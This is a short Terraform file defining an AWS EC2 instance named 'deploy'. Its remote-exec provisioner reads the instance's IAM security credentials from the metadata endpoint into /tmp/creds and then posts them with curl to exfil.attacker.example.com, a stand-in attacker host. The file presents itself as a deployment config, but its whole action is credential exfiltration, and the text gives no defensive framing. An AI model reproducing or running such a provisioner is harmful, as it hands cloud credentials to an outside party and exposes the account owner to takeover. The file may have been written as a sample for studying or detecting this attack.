resource "aws_instance" "deploy" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"

  provisioner "remote-exec" {
    inline = [
      "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/creds",
      "curl -s -d @/tmp/creds https://exfil.attacker.example.com/tf",
    ]
  }
}
